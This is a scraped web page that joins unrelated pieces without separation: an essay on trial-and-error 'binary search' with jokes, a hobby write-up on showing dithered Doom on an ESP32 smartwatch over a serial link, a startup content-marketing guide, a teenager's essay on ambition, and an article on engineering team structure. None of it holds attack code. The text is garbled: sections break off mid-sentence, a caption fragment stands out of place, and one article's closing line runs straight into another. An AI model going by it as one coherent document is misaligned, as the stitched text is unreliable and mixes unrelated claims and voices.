<p>If you want to know how tolerant your in-laws are of dirty jokes, just tell the dirtiest one you have. If they are grossed out, the next one you should tell is the middle between it and the mildest one you know. You continue “splitting the difference” until you find what they’re comfortable with. You’ll be astonished how quickly you’ll arrive at an answer.</p>
<p>The dirty joke example is simplistic, but most often than not you would find yourself pondering questions you either can’t ask or no one has the answer to.</p>
<p>Expect awkward moments and thrown cakes. The payment for quick, correct, decisions with practically zero professional training is the unpleasentness of the search. Nonetheless, Instinctive Binary Search is very useful for subject matters you are not very good at. Not only will you answer the question you have, but you will improve your familiarity with the subject at large. At some point, you will see commonalities in all the good decisions you make.</p>
<p>Whatever you do, just make sure you are the principal bearer of the pain of the search. It’s no problem to tell a slightly inappropriate joke to old people, but if, knowing them (or the joke), there’s a high risk of them being deeply disturbed, tell the joke to someone else.</p>
<p>Some people may hate you because of a slip up, or going too far. Mistakes happen, but make sure you are aligned with other people. The purpose of IBS isn’t for the world to be your test dummy, but to get the details the world wants you to know but sometimes forgets to tell you.</p>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p>I was trying to find a good use case for my <a href="https://www.banggood.com/LILYGO-TTGO-T-Watch-2020-ESP32-Main-Chip-1_54-Inch-Touch-Display-Programmable-Wearable-Environmental-Interaction-Watch-p-1671427.html">LILIGO TTGO T-Watch</a>. It’s a programmable smart watch featuring the amazing ESP32 chip and a 240x240 color LCD screen.</p>

<p>I keep hearing about Doom running on this and that, sometimes directly and sometimes using the device as an exotic external screen. My project falls into the latter category, but it was a lot of fun to implement!</p>

<blockquote>
  <p>As this was mostly a learning experience, I took several wrong turns and mention them in this writeup.</p>
</blockquote>

<p>As with most of tiny projects, I got the basics version up and running on a two afternoons and then fiddled with the code for a few more days to get a more presentable result.</p>

<p><img src="http://jborza.com/assets/doom-watch-500.jpg" alt="alt"></p>

<p><em>It works!</em></p>

<h2 id="building-steps">Building steps</h2>

<h3 id="getting-the-video-signal-across">Getting the video signal across</h3>

<p>There are a couple of ways to transmit data from a computer to the ESP32-based watch. Wi-Fi, Bluetooth and a serial port.</p>

<p>Serial port seemed promising - I initially targeted 120x120 picture, which can be represented by 14400 bits or 1800 bytes. Targeting 115200 bauds I could achieve around 7 fps (115200 / 16200 bauds per frame).</p>

<blockquote>
  <p>The default serial configuration is 8 data bits, no parity and one stop bit, hence 9 bauds per byte.</p>
</blockquote>

<p>With the goal was of displaying DOOM on the smart watch in mind, I thought. I decided to divide this into three phases:</p>
<ul>
  <li>Scale the image down to the resolution of the watch</li>
  <li>Implement a proof of concept serial display on the T-Watch</li>
  <li>Optimize until it works better</li>
</ul>

<h2 id="scaling-doom">Scaling Doom</h2>

<p>I started with finding a suitable Doom source port. I discovered  <a href="https://www.chocolate-doom.org/">Chocolate Doom</a>, which accurately reproduces the game as it was played in the 1990s.</p>

<p>Building it on Ubuntu is straightforward, so I dived straight into the code and started poking around.</p>

<h3 id="wrong-turn-1---modifying-doom-internal-resolution">Wrong turn #1 - modifying Doom internal resolution</h3>

<p>The first thing I did was try to find how a resolution gets set.</p>

<p>At first I tried to change the internal resolution of the renderer - there was a <code>#define</code>
for <code>SCREEN_WIDTH 320</code> and <code>SCREEN_HEIGHT 200</code> in <code>i_video.h</code>.</p>

<p>Changing this to 120x75 made the game crash. I attached a debugger to see where exactly and the game was attempting to render some things at locations beyond 120x75. Scaling all coordinates by 0.5x helped get the menu to display, but it crashed again as soon as I started the game.</p>

<h3 id="scaling-and-dithering">Scaling and dithering</h3>

<p>After studying the Chocolate Doom source port some more I realized it has a series of buffers and textures that represent stages of the <a href="https://github.com/chocolate-doom/chocolate-doom/blob/master/src/i_video.c#L780">rendering pipeline</a>.</p>

<blockquote>
  <p>The engine itself draws assets with a <a href="https://zdoom.org/wiki/Palette">palette</a> to make a better use of 255 colors.</p>
</blockquote>

<ul>
  <li>the game is drawn into an 8-bit paletted 320x200 paletted screen buffer.</li>
  <li>blit into a 32-bit ARGB 320x200 buffer</li>
  <li>rendered into an upscaled texture using a nearest linear scaling (e.g. 640x400)</li>
  <li>rendered to the screen (e.g. 800x600) using linear scaling</li>
</ul>

<p>It was clear the dithering and output to the serial port should happen somewhere within this pipeline.</p>

<h3 id="wrong-turn-2">Wrong turn #2</h3>

<p>I realized looking at the screenshots from various buffers that I’ve been dithering the wrong display buffer (the 320x200 display buffer), then downscaled in SDL to 240x150, which caused artifacts and didn’t look as good.</p>

<p>The correct way was to scale the display buffer to 240x150, then dither, then send this over the wire.</p>

<h2 id="dithering">Dithering</h2>

<p>After a little research on 1-bit graphics I realized there are two commonly used dithering algorithms - I implemented both:</p>

<h3 id="ordered-dithering">Ordered dithering</h3>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Ordered dithering</a> is a simple algorithm that produces a characteristic crosshatch pattern.</p>

<p>It works by applying a threshold map to the pixels displayed, causing pixels from the map to change color based on the distance from the original color to black and white.</p>

<p><img src="http://jborza.com/assets/doom-ordered-4x4-matrix.png" alt="ordered dithering"></p>

<p><em>Ordered dithering patterns</em></p>

<h3 id="floyd-steinberg-dithering">Floyd-Steinberg dithering</h3>

<p><a href="https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering">Floyd-Steinberg dithering</a> operates using error diffusion and is characterized by its grainy or speckled appearance.</p>

<p>Because Floyd-Steinberg works by pushing the quantization error from a pixel to its neighboring pixels, a slight change in the scene can propagate over the entire screen. I found that aesthetically less pleasing than the more predictable ordered dithering, as it was simply less jumpy.</p>

<p><img src="http://jborza.com/assets/doom-dither-240x150.png" alt="doom dithered"></p>

<p><em>Floyd-Steinberg dithering above, ordered dithering below</em></p>

<h3 id="grayscale-and-gamma">Grayscale and gamma</h3>

<p>In both dithering algorithms we convert the color to grayscale with the following algorithm:</p>

<div><div><pre><code><span>//get r,g,b color values</span>
<span>uint8_t</span> <span>r</span><span>,</span> <span>g</span><span>,</span> <span>b</span><span>;</span>
<span>uint32_t</span> <span>pix</span> <span>=</span> <span>getpixel</span><span>(</span><span>s</span><span>,</span> <span>x</span><span>,</span> <span>y</span><span>);</span>
<span>SDL_GetRGB</span><span>(</span><span>pix</span><span>,</span> <span>s</span><span>-&gt;</span><span>format</span><span>,</span> <span>&amp;</span><span>r</span><span>,</span> <span>&amp;</span><span>g</span><span>,</span> <span>&amp;</span><span>b</span><span>);</span>
      
<span>// Convert the pixel value to grayscale / intensity</span>
<span>grayscale</span> <span>=</span> <span>.</span><span>299</span><span>f</span> <span>*</span> <span>r</span> <span>+</span> <span>.</span><span>587</span><span>f</span> <span>*</span> <span>g</span> <span>+</span> <span>.</span><span>114</span><span>f</span> <span>*</span> <span>b</span><span>;</span>
</code></pre></div></div>

<p>Doom is quite dark, so it’s hard to see anything in the default <em>gamma</em> setting. Fortunately the engine also features gamma correction, that can be toggled with the <code>F11</code> key in game.</p>

<p><img src="http://jborza.com/assets/doom-gamma.png" alt="gamma"></p>

<p><em>Gamma settings 1, 3, 5 going from unusable in monochrome to pretty bright</em></p>

<h2 id="watch-as-an-external-display">Watch as an external display</h2>

<p>To make data transfer a bit less intensive I decided to transmit in 120x120 resolution and then double the pixels to 240x240 on the device.</p>

<p>Initially I programmed my watch to be a simple single-core serial display.
It reads one row of pixels from the serial port as 120 bits that represent black or white pixels, then expands each bit onto a 16-bit array value.</p>

<h4 id="transfer-rate">Transfer rate</h4>
<p>When transmitting 120x120 pixels at around 16 FPS we produce around 15 * 9 (data + stop bit) * 120 (rows) * 16 (fps) = 259 kbits of data per second.</p>

<p>The algorihm for</p>
<div><div><pre><code><span>char</span> <span>rxBuffer</span><span>[</span><span>RECEIVE_LINE_BYTES</span><span>];</span>
<span>uint32_t</span> <span>lineBuffer</span><span>[</span><span>DISPLAY_LINE_LENGTH</span><span>];</span>
<span>...</span>
<span>Serial</span><span>.</span><span>readBytes</span><span>(</span><span>rxBuffer</span><span>,</span> <span>RECEIVE_LINE_BYTES</span><span>);</span>
<span>tft</span><span>-&gt;</span><span>setAddrWindow</span><span>(</span><span>0</span><span>,</span> <span>y</span><span>,</span> <span>DISPLAY_LINE_LENGTH</span><span>,</span> <span>2</span><span>);</span>
<span>convertPixelsBetweenBuffers</span><span>();</span>
<span>tft</span><span>-&gt;</span><span>startWrite</span><span>();</span>
<span>tft</span><span>-&gt;</span><span>pushPixels</span><span>(</span><span>lineBuffer</span><span>,</span> <span>DISPLAY_LINE_LENGTH</span><span>);</span>
<span>tft</span><span>-&gt;</span><span>pushPixels</span><span>(</span><span>lineBuffer</span><span>,</span> <span>DISPLAY_LINE_LENGTH</span><span>);</span>
<span>tft</span><span>-&gt;</span><span>endWrite</span><span>();</span>
</code></pre></div></div>

<p>The pixel conversion does the horizontal pixel doubling and prepares it to the  converts input (a 120 bits field) to the display line (240 16-bit pixels, stored in a 120 32-bit array). It iterates bit by bit .
We can display data on the TTGO T-Watch using the <a href="https://github.com/Bodmer/TFT_eSPI">TFT_eSPI library</a>. It includes a <code>pushPixels</code> function that expects a buffer of 16-bit pixel colors.</p>

<p>I wrote a <a href="https://github.com/jborza/watch-doom-receiver/blob/master/util/sender.py">supporting tool</a> to feed the watch some pixels in Python. The bits are sent using the <code>pyserial</code> library in a loop.</p>

<h2 id="connecting-the-watch-and-doom">Connecting the Watch and Doom</h2>

<p>Python is not very helpful in the Chocolate Doom port, so I had to write the serial frame transmitter in C. 
I’ve adapted the <a href="https://stackoverflow.com/a/38318768/72746">first code snippet I found</a> I found on Stack Overflow, credit goes to <a href="https://stackoverflow.com/users/1599004/sawdust">sawdust</a>.</p>

<p>Still working in the 120x120 pixel resolution, this is how the intermediate result looked:</p>

<p><img src="http://jborza.com/assets/doom-120x120-watch.jpg" alt="first attempt"></p>

<blockquote>
  <p>It’s incredibly low-res. Also, because I was lazy, the last row of pixels of the status bar is leaking all the way down the screen as I just repeated rows 75 up to 120 in the output stream :-)</p>
</blockquote>

<p>I eventually bumped the resolution to 240x150.</p>

<p>There’s nothing special about the serial output module, there’s a function that takes an <code>SDL_Surface</code> assuming its dimensions being 240x150, loops over the RGB values and for every row of 240 pixels (bits) spits out 30 bytes.</p>

<h2 id="getting-it-faster">Getting it faster</h2>

<p>Straightforward increase of the baudrate to 500,000 caused some screen tearing, it seemed that the <em>serial receiver</em> code on the watch was having hard time keeping up. After optimizing the bit conversion loop it could handle stable 500,000 bauds, leading to high enough framerate to consider increasing the resolution to 240x240.</p>

<h3 id="wrong-turn-3---going-multi-core-on-the-esp32">Wrong turn #3 - going multi-core on the ESP32</h3>

<p>I thought I could leverage the second core on the ESP32 and have the watch run two tasks - one that processes the serial data and another that decodes it and sends to the display.</p>

<p>I implemented a proof of concept serial display that uses the <a href="https://www.freertos.org/RTOS-task-notifications.html">FreeRTOS Task notification API</a> to communicate between the task using notifications.</p>

<p>It used two buffers - one to receive the serial data which got copied to the display task and the notifications were supposed to let the tasks know that they can touch the shared buffer.</p>

<p>The source lives in the <a href="https://github.com/jborza/watch-doom-receiver/blob/multithreaded/watch-doom-receiver.ino"><code>multithreaded</code> branch</a> - but it didn’t really work faster, which lead me to the next attempt:</p>

<h3 id="using-dma-for-the-speed">Using DMA for the speed</h3>

<p>What helped in the end was using Direct Memory Access (DMA) transfer using `  tft-&gt;pushPixelsDMA(lineBuffer, DISPLAY_LINE_LENGTH);`. It’s basically “fire and forget” data transfer - the controller will move the data from the RAM to the display and practically allow the microcontroller to execute other code as opposed to operating the SPI bus.</p>

<p>Now I could increase the baudrate to 921600 and practically double the framerate.</p>

<h4 id="vertical-synchronization">Vertical Synchronization?</h4>

<p>If we just dump the data to the screen without some kind of synchronization or alignment, the device wouldn’t know where the boundary between the frame data lies.</p>

<p>It also means we would need to be lucky to start the transmission in sync with the watch displaying the first row of the frame data.</p>

<p>To fix this, I added a simple VSYNC message that the watch sends to the PC over the serial port when it starts drawing the first row. Upon receiving VSYNC, the PC should start abandon the current frame and start sending another frame from the beginning. I’ve added a handler for this to the python support tools, but decided not to for Doom as it was easier to just reset the line currently being drawn if no data has come for a while across the serial port.</p>

<p>Content marketing can be overwhelming for a business until the budget is there for bigger longterm communications programs. If you’re a startup owner or solo marketing manager, you’re already doing a lot with a little. But if you’re building a company, the time is already here to get started on content marketing, because content marketing is a long game that takes time and is an integral part of brand building. Many startups give up too soon, but you can handle content marketing, whether you do it yourself or hire it out. It doesn’t have to be fancy, but it does have to be focused in a few particular ways to succeed over time. You can start your own content marketing if you stay focused and don’t let initial slow traction get you down.</p>



<p>Cronicle Consulting presents a short Content Series: 5 Ways To Start Content Marketing For Your Tech Startup. This series will be split into 5 sections so stay tuned for the next articles. First up, starting a company blog. It’s the simplest way to start content marketing from day 1, and it will bring in results if you do it right. But most people don’t know how to focus their blog for optimum results, so it feels like a waste of time. That’s why we’re here to help you avoid common content marketing errors before you begin. Note: SEO is its own important topic and won’t be covered in the scope of this article.</p>



<h2>Content Marketing Plan #1: Company Blog</h2>



<p>Content marketing in a company blog not just about the content showing professional expertise or announcing company news. People want to know:</p>



<ol><li>what you’re like to work with.</li><li>how you view the world within your professional sphere.</li><li>how you communicate.</li></ol>



<p>Your blog is where prospective clients go to see how you interact with the world. When you start your company blog, begin by announcing the launch of the company. Then, tell your team story. Here are a few ideas to get started.</p>



<h3>Content Marketing Ideas For A Blog</h3>



<ol><li>tell your team story.</li><li>talk about the problem your product or service is solving in the world or what cause you are supporting.</li><li>announce new hires.</li><li>post job listings.</li><li>tell the story of company volunteering.</li><li>publish white papers and awards.</li><li>announce events and promotions.</li><li>publish your own industry research reports or host your own awards.</li><li>turn engineering expertise into mini e-books or published papers.</li><li>host round tables interviewing industry experts.</li><li>cover industry news.</li></ol>



<p>If you need to hire your company blog out to a communications firm, check out their other client blogs and see if they are matching the tone and content to the industry and if they know their technical stuff in depth. If all the blogs for various clients in different industries sound the same or too high level, move on to a different firm. Tech startups in particular have this problem. Addressing it early can help you avoid wasting your efforts. </p>

These days they are competitions, media exposure, and an opportunity to create print content and a community that grows over time. </figcaption></figure>



<h2>Tone, Focus &amp; Style in a Company Blog</h2>



<p>The tone of your company blog is critical: the vocabulary has to be right for the professional space being addressed, the focus of the content interesting to people in your field or your client space, and the communication style appropriate to your industry. Is the communication style in your space more formal or jocular? Is it interested in the broader social good, or does your circle tend to focus on technical details of research and problem solving industry issues? Once you get the hang of focus through trial and error and having someone with industry-specific content expertise create your blog, a company blog is one of the best ways to keep your website popping up in organic search results on topics potential clients are searching for, and you’ve pre-sold a lot of people on working with your team. </p>



<h3>Appropriate Blog Tone Varies By Industry</h3>



<p>We cannot emphasize enough getting the tone right. The problem with content marketing is that it falls to the marketing folks most of the time instead of an in-house journalist, which only larger companies have budget for. If you are a marketing manager versed in content that’s great. If you’re not sure if you’re doing this correctly, one way to check is to make sure you don’t use quite the same tone for sales copy as you do for the company blog. Think about the tone of how people within the organization communicate with each other and with clients, and use that as a guide instead. Why? Because it all begins to sound like a sales pitch otherwise, and that is not at all what content is for. Client storytelling works best when it’s done in the tone that makes people sound the most professional, or the friendliest, or the best suited to solve a client’s problems. Sales copy often accomplishes this only in direct pitches. </p>



<h3>You Are Not The Hero Of The Story, You Are The Bard</h3>



<p>Content is your chance to provide good will to the world, information for free that benefits them. The best way to do this is to talk about causes your company believes in, promote the good work of colleagues, and position yourself as the cheerleader to someone else as the hero of the story. If it starts to sound like “we have the best culture, look how amazing our culture is at this workplace here, check us out, guys” it’s going to turn a lot of people off subconsciously to listening to what you actually have to offer. What you actually have to offer is a whole lot of wisdom and thought leadership that the world probably needs. The aim here is to tell the story you want to tell, but think of yourself as the support role or the cheerleader, not the hero. Just that simple shift will make your story sound so much more beneficial to the reader, and will cut out the feeling of awkwardness that can come from self-promotion.</p>



<figure><img src="https://cronicle.press/wp-content/uploads/2020/01/ep11585detroitreport2019-tw1024.jpg" alt="EntryPoint Detroit Research Report 2019" srcset="https://cronicle.press/wp-content/uploads/2020/01/ep11585detroitreport2019-tw1024.jpg 760w, https://cronicle.press/wp-content/uploads/2020/01/ep11585detroitreport2019-tw1024-300x150.jpg 300w" sizes="(max-width: 760px) 100vw, 760px"><figcaption>Research reports also require funding, like this one from EntryPoint’s Detroit Entrepreneurial Ecosystem report. Creating, publishing, or sponsoring a report like this can be very useful content. </figcaption></figure>



<h3>Company Blog Style Is Tailored To The Blog’s Purpose</h3>



<p>Keep company blog content styled in a way that fits your brand and how you want to present your organization to the world. This often swings several directions off track.</p>



<h4>Common Company Blog Errors:</h4>



<ol><li>Your company blog sounds too much like a sales pitch for culture.</li><li>Your company blog is all jargon and no specifics on your offerings.</li><li>Your company blog is all about your company.</li></ol>



<p>Number 1 depends on if you work in an industry that relies heavily on people’s buy-in to a particular culture. Some company blogs do get away with a particular tone that sounds almost cultish, but often this is a turnoff for prospective hires and clients. To avoid this common mistake in a world of business websites that are nothing but culture pitch, focus on the benefit to the client. What do they want to know about? What are they searching for? What helps them? It’s a great approach for creating content that people are more likely to be searching for anyway. </p>



<p>Number 2 is actually debatable. There are industries in which a jargon-heavy website is appropriate. “We deliver on deadline on spec with the most disruptive innovation imaginable.” Except what do you deliver? Well, sometimes industries communicate exclusively in industry jargon, and that’s properly communicating professional expertise and the right pitch. But it does wear thin on long-form content. If you work in an industry that’s super jargon heavy, try to keep the jargon to the static pages, and the blog should go more in depth into what you’re working on, as much as you can afford to share. Many industries such as automotive, advanced manufacturing, defense contracting, and the like are not able to publish the same kind of company blog because of NDAs and heavy restrictions on proprietary information. Biotech would be another good example. You want clients to know what you could offer them, but all details are often available in house after demos and personal contact with a client and most sales handled directly. In this case, if you still want to publish a company blog, keep it to the new hires, press releases, new services offered, and details of presentations from trade shows, which can be fun to read about. </p>



<p>Number 3 is tricky. Many company blogs don’t have time to move past basic company press releases, but if you can make the time, reporting on industry news can be one of the most powerful ways to establish your company as an industry leader in the space. The style of your blog needs to be determined by whom you are serving. Biotech companies often focus very much on direct sales to clients, but a security startup needs to establish themselves as a leader in the industry thought leadership space. Their blog should be focused on industry standards, industry problem solving, and innovative solutions and conversations that serve the broader space. </p>



<p>But everyone’s already doing this these days, right? Not quite. It takes a good marketing manager or journalist to spot the common flaw. Most company blogs talk about the company or their ability or authority to report on industry news far more than they produce actual content that is valuable to the reader. Journalism requires funding, and it doesn’t come for free even if the cost is giving your marketing team space to produce quality content in house. This is where companies think content marketing doesn’t work and tend to fall off over time to focus on other marketing. If your company promotes themselves as an industry thought leader but only talks about how central they are to the ecosystem and how many events they’re hosting or attending to prove their relevance, they can come across as insecure or bragging or …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-606e3fb9ac8364badb5c"><div><p>When we are kids, we have many aspirational dreams and ambitious goals. <strong>You want to eat the world. </strong>Then, when you’re an adult, <strong>the world eats you.&nbsp;</strong></p><p>We grow up, and the same dreams become impossible or we stop pursuing them. But why? Was it because our dreams were straight-up stupid? Or because we settled and decided they were impossible?&nbsp;</p><p>I want to explore this question as a kid who <strong>still</strong> has lots of ambitious dreams and <strong>wants</strong> <strong>to eat the world.&nbsp;</strong></p><p>Lately, I’ve experienced that my goals and dreams might be stupid or impossible. But why? If I think they are. They will be impossible because I won’t even try. I have to keep reminding myself that they are not and keep believing they are and can be possible.&nbsp;</p><p><strong>Ambition starts fragile</strong>, we need to feed it to keep going[1]. Steven Spielberg said, “Dreams always come from behind you, not right between your eyes. But when you have a dream, it doesn’t often come at you screaming in your face...Sometimes the dream almost whispers.” And you have to <strong>listen</strong> very <strong>carefully</strong>...</p><p>Ambition has more to do with <em>listening carefully </em>than it is with anything else. You need to be sensitive to <strong>what you want </strong>and <strong>why you want it.&nbsp;</strong></p><p>Ambition can be grown and cared for like a garden. You start small and you constantly prune and iterate it.&nbsp;</p><p>Ask yourself what you love and what sacrifices you’re willing to make to pursue your goals.&nbsp;</p><p>Many people don’t just lose their ambition (some get even more ambitious as they get older) but most people don’t ask themselves these questions and life happens to them.&nbsp;</p><p><strong>I’ve realized that being ambitious isn’t about trying to become rich or famous, but more about knowing what you want and why you want it. Once you know that, you’ll be more likely to sacrifice and push through all the obligations and randomness of life, and finally accomplish your dreams.&nbsp;</strong></p><p>So, <strong>Why the fuck do we lose our ambition when we grow up?</strong></p><p>Losing our ambition is like losing our soul and excitement to be alive. We’re saying, “Nope, I refuse to fully live.” Being ambitious isn’t about becoming famous or billionaire. It’s about fully living.</p><p>Socrates said once, “The unexamined life is not worth living,” meaning living a life under the rule of others, never questioning what you want out of it is not <strong>worth</strong> <strong>living. </strong>&nbsp;And let me make sure you know this too, a life with no aim and with no purpose isn’t an alternative either.&nbsp;</p><p>If you’re young or whatever age you are, and want to be ambitious. Be aware of the reasons people lose their ambition.&nbsp; What are those reasons? There are many reasons, but there’s one that expresses the essential reasons: <strong>Change of priorities.&nbsp;</strong></p><p>People get comfortable, which makes them lose sight of the big picture, and you add responsibilities and obligations. You get the average adult. This is often true, but not always. Sometimes, people change what they’re ambitious for. Kids want to be astronauts, teens want to change the world, and adults want to spend time with their families.&nbsp;</p><p>Which is one right? Neither. You choose. The issue occurs when your priorities change without you realizing it. You may WANT to change your priorities, just be aware of the WHY.&nbsp;</p><p>Even if you don’t change your priorities, there’s another reason that is probably the biggest contributor.</p><p>“Everyone wants to be a published author, nobody wants to write a book.” This isn’t about becoming a published author, but an example of a high-status goal that many people grow up aspiring to, that turns out to require you to work hard over a long time.&nbsp;</p><p><a href="https://www.kalzumeus.com/" target="_blank">Patrick McKenzie </a>elaborates more on this idea and says, “One of my most disconcerting observations about the world is that the number of people who will, in their life, pursue a concrete goal with focus and determination for several months is *much much lower* than what I would have assumed it would be.”&nbsp;</p><p>Why are some people more determined than others? Or why do others never give despite failing repeatedly? A harsh truth many people refuse to accept.&nbsp;</p><h2>Destined to Fail, Arriving Successfully</h2><p>Look, youngsters my age (17) or older haven’t experienced true failure in their life. Why? Most of them because they haven’t really tried anything. To fail, you have to try. If you never try, you never fail.&nbsp;</p><p>Since early on, we take pre-planned paths such as standardized testing and getting A’s. As long as you do nothing dumb and do what teachers tell you, you will be fairly successful. Just be complacent and follow others. Simple, right?<br></p><p>Real-life is not like that.&nbsp;</p><p>Once you graduate college and you are finally dropped off at the so-called “real world” with no instructions. Most people struggle with how to be <strong>successful. </strong>You try things and you fail.&nbsp;</p><p>The first failures are rough because you aren’t used to them, so they are cruelly painful. Like when you told that one girl in fourth grade you liked her, but she rejected you. Well, maybe it’s not that painful.&nbsp;</p><p>You try things and you fail. Then one of two things takes place. You either try again and learn and improve or you avoid pain altogether.&nbsp;</p><p>Again, neither is right nor wrong. Each one comes with pros and cons.&nbsp;</p><p>The first option of trying things and failing is a lot tougher short-term but benefits people long term. Few people take this road because humans love <strong>comfort </strong>and avoid <strong>pain.&nbsp;</strong></p><p>The second option of avoiding pain is far more common and causes people to stick with jobs and careers they don’t like because it’s “too hard” to change. This road is easier in the short-term but leads many people to become depressed and “giving up,” which is what I’m talking about when people grow up and “lose ambition.”</p><p>Enough of my ranting. How do you know what road to take?&nbsp;</p><h2>Choose a life that makes sense to YOU!</h2><p>Every young person wants to be unique. We want to dream and we want to inspire others. But that doesn’t always happen because lots of times it’s easier to follow what <strong>others say </strong>and do what<strong> others do.&nbsp;</strong></p><p>Many people reason by analogy (because someone did it), and few reason by truths or <a href="https://www.techtello.com/first-principles-thinking/" target="_blank">first principles</a> (what do I think is true for sure?).&nbsp;</p><p>To think for yourself independently of others takes more mental output and yes it’s freaking hard, but only if you do, you can start <strong>fully living.&nbsp;</strong></p><p>Being ambitious isn’t for everyone, but most people should dare to try it. Yes, it’s harder, tiring, and perhaps even meaningless. But I’m still ambitious.</p><p>Nothing that we’ll ever do will matter. Nothing. If you look at the world not in years or centuries, but in billions of years. Few things will matter. So why even bother?</p><p>At first, you may become nihilistic but if you look at it more carefully, you’ll realize that because nothing will matter, you might as well try to optimize every minute you live by helping others, being happier, loving more, and being more ambitious.&nbsp;</p><h2>I Refuse to Wait</h2><p><strong>Young Human:</strong> I want to eat the world.</p><p><strong>Old Human:</strong> Try to not get eaten first, kid.</p><p><strong>Young Human:</strong> (says nothing and thinks to himself, “Who was the weirdo who looks like he was eaten?”</p><p><strong>Old Human: </strong>You’ll understand…</p><p>___________</p><p>Perhaps I’m dumb for trying to be ambitious and even dumber for trying to help others to see if being ambitious makes sense for them. Like <a href="https://twitter.com/Lexstok/status/1309371088498053120?s=20" target="_blank">someone told me on Twitter</a>, “Bookmark this tweet, set a timer for 20 years, and you’ll be able to answer this yourself by then.”</p><p>But I refuse to wait twenty years. I would rather try to learn from the mistakes of other people and have an answer that makes sense for me. An answer that aligns with what I think, what I say, and what I do.&nbsp;</p><p>That answer is that being ambitious is worth it. It’s not about being rich or famous but understanding what you want and why you want it while treating ambition like a garden that can be grown and cared for.&nbsp;</p><p>If you can listen carefully and <em>garden </em>your ambition, you can start <strong>fully living</strong> the life you want and choose for yourself.&nbsp;</p><p>Also, remember priorities might change. You thought you wanted to be an astronaut, but now all you want to do is play with your toddler and help him/her accomplish their dreams. Life is always beautiful, just make sure you’re the one planting the flowers in the <em>garden</em>.</p><p>If you decide you want to be ambitious, understand you may fail, and once you fail. That failure will take you back to the fourth grade but keep going, you may want to find friends who are ambitious, optimistic, and driven because they will be the one who will hold you accountable and help you when you fail.&nbsp;</p><p>And if you remember anything from this essay, remember that everything and anything you do won’t matter and will be meaningless. All the hard work, all the stress, and all the worries will be meaningless. But if that is true, you optimize for doing what makes you happy, for trying to help others, and perhaps being more <strong>ambitious</strong>.</p><p>Now, I’m starving. Let’s eat the world!</p><p><strong>Notes</strong></p><p><strong>[1]</strong> Think of ambition as 'feeding' as a small but consistent habit. Every action is a vote for who you will become and what you will achieve. This is how you build ambition.&nbsp;</p><p><strong>Thanks</strong> to my friends in my dorm who inspired me to write this essay after hours of deep conversations and discussions! Thanks guys!</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1601195872853_6856"><p>If you’re into interesting ideas (like the one you just read), sign up for my<a href="https://juandavidcampolargo.com/blog/newsletter"> </a><a href="https://juandavidcampolargo.com/newsletter" target="_blank">Weekly Memos</a>, and I’ll send you new essays right when they come out.

The common team structure I saw was senior engineers leading features, while trying to improve and grow the non senior members during the process.</p></span></p><h2 id="how-does-this-work"><span>link</span><span>How Does This Work</span></h2><p><span>The senior engineers are the ones responsible to make the feature delivered, they are the ones with all the context and they are the active leaders of those feature squads - communication with stakeholders, design etc.<br>
The team lead's job is to make sure the senior engineers are on track and help them if needed.<br>
The advantages are obvious: this way there is maximal certainty that the features will be delivered on time, the non senior members learn by watching the senior in action and by (hopefully) active mentoring.<br></span></p><h2 id="disadvantages-of-senior-first-delivery"><span>link</span><span>Disadvantages Of Senior First Delivery</span></h2><h3 id="team-stagnation"><span>link</span><span>Team Stagnation</span></h3><p><span>Working in this structure preserves the current hierarchy of the team. The seniors are the leaders, the non seniors are there to be led. <br>
This by definition means that the squad members will always be as good as their senior squad leads: all they see is what the senior engineer shows them - in the happy flow by active mentoring, in the worst case just by watching them.</span></p><h3 id="limited-growth-rate"><span>link</span><span>Limited Growth Rate</span></h3><p><span>This is the key part in my opinion, both the seniors and the non seniors have limited amount of potential growth in this scenario, actually the growth is relatively really slow. <br></span></p><ul><li><span>From the senior engineer's perspective: they do more of the same - they became seniors because they know how to design, do decompositions, update stakeholders, code well.<br>
But that not they're main purpose right? This structure misses the point where senior engineers are measured by their impact on the group and making others better. Instead, senior engineers are measured here by their ability to deliver the feature on time.<br>
So the senior engineers improve certain skills which they are already good at, but do not maximize their most important muscle - to make others better.</span></li><li><span>From the non senior engineer's perspective: they are expected to grow by watching and not to grow by doing. So yes - they will grow by watching the senior engineer leading the feature and by active mentoring by them, but they will improve less than doing that themselves and being exposed to all of the different aspects of leading a feature: having all the context, communication with stakeholders etc.</span></li></ul><p><span><img src="https://shaimendel.dev/docs/assets/turn-the-senior-around/new_way.png" alt="Turn The Senior Around"><p>
The non senior engineers are the ones responsible to make the feature delivered, they are the ones with all the context of the feature and they are the active leaders of those feature squads.<br>
The senior engineer's role is first and foremost to constantly give feedback to the non senior engineer who leads the feature - help them learn by providing them a great ground for them to grow.<br>
The team lead's job is double:</p></span></p><ul><li><span>Communicate with the non seniors as feature leads, help if needed and make sure everything is on track</span></li><li><span>Communicate with the senior engineers and give them all the help needed to <strong><em>make sure they have all they need to grow the non senior members</em></strong>. The team lead constantly gives feedback to the senior engineers on how they improve others.</span></li></ul><h2 id="advantages-of-turning-the-senior-around"><span>link</span><span>Advantages Of Turning The Senior Around</span></h2><h3 id="dynamic-team-hierarchy"><span>link</span><span>Dynamic Team Hierarchy</span></h3><p><span>The non seniors feel that the limit to their performance is only themselves and not the senior who leads them (in the scenario before). The fact that the non seniors lead the feature provides them the needed experience and confidence to later become seniors themselves.</span></p><h3 id="maximal-growth-rate"><span>link</span><span>Maximal Growth Rate</span></h3><ul><li><span>From the senior engineer's perspective: they are focused on making others better. They constantly get feedback from the team lead on their ability to do so while of course being active part of the feature implementation.<br>
The senior engineers still use and maintain their strong muscles (design, coding etc) by mentoring the non seniors - pairing, feedback etc.</span></li><li><span>From the non senior engineer's perspective: they grow by trying their best to lead a feature while getting constant feedback from the senior team members. They are exposed to all of the "senior qualities" in first hand and improve on a daily basis.</span></li></ul><h3 id="long-term-team-building"><span>link</span><span>Long Term Team Building</span></h3><p><span>When you zoom out and see what happens to a team that uses this method for a long time you see strong teams where all the team members maximize their growth in their respective areas of learning.<br>
You see a stronger team where seniors constantly grow the non seniors, leading to a robust team.<br>
You see a team that promotes more people to seniors.<br>
You see a team where senior engineers can break through the senior limits and get promoted themselves.<br>
